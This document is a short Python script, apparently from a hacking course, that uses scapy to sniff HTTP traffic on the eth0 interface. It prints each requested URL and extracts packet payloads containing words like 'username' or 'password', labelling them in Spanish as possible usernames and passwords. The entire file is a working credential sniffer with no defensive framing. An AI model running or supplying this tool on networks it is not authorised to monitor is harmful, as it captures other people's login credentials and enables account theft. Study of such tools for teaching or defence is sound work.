import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path      

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username","user","password","pass"] 
        for keyword in keywords:
            if keyword in load.decode('UTF-8',errors='ignore'):
                return load 
                

def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        url = get_url(packet)
        print("[+] HTTP Request >>>" + url.decode('UTF-8',errors='ignore'))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Usuario y contraseña posibles >" + login_info.decode('UTF-8',errors='ignore') + "\n\n")
 
    

sniff("eth0")
